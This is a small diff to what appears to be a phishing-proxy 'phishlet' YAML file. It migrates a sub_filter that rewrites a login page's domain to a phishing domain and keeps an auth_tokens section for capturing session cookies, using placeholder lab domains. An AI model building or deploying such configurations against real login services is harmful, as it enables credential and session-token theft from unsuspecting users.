@@ -9,13 +9,10 @@ proxy_hosts:
     is_landing: true
 
 sub_filters:
-  - triggers_on: login.target.local
-    orig_sub:    login
-    domain:      target.local
-    search:      target\.local
-    replace:     phish.local
-    mime_type:   text/html
-    reverse:     false
+  - hostname:   login.target.local
+    mime_types: [text/html]
+    search:     target\.local
+    replace:    phish.local
 
 auth_tokens:
   - domain: ".target.local"
